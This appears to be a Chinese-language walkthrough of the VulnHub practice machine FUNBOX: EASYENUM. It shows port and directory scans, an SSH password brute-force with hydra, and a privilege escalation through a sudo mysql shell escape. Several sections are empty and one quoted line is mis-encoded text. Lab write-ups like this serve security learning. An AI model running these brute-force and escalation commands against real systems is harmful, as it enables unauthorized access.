# 原创
：  VulnHub渗透测试实战靶场 - FUNBOX: EASYENUM

# VulnHub渗透测试实战靶场 - FUNBOX: EASYENUM

#### VulnHub渗透测试实战靶场 - FUNBOX: EASYENUM

## 题目描述

```
Boot2root in 6 steps for script-kiddies.

Timeframe to root this box: 20 mins to never ever. It's on you.

HINTS:
Enum without sense, costs you too many time:
  1.Use "Daisys best friend" for information gathering.
  2.Visit "Karla at home".
  3.John and Hydra loves only rockyou.txt
  4.Enum/reduce the users to brute force with or brute force the rest of your life.

This works better with VirtualBox rather than VMware

```

## 环境下载

> 



## FUNBOX: EASYENUM靶机搭建

> 

- 将下载好的靶机环境，导入 VritualBox，设置为 Host-Only 模式- 将 VMware 中桥接模式网卡设置为 VritualBox 的 Host-only


> 



## 渗透测试

### 信息搜集

> 
用 Nmap 扫描一下目标靶机的端口信息：`sudo nmap -sS -A -Pn 192.168.56.115`，发现开放了 `22、80、110、143` 四个端口


> 
用 dirb 扫描一下 80 端口 web 目录：`dirb http://192.168.56.115`


### 漏洞挖掘

> 



```
Allow: Enum_this_Box

æ ¹å¯†ç æ˜¯ç”¨æˆ·å¯†ç çš„ç»„åˆï¼šharrysallygoatoraclelissy 

```

> 



```
gobuster dir -u http://192.168.56.115 -w /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt -x php,html.txt

```

### getshell

> 



### 提权

> 



> 



```
hydra -l username -P rockyou.txt -V 192.168.56.115 ssh

```

> 



```
sudo /usr/bin/mysql -e '\! /bin/sh'

```
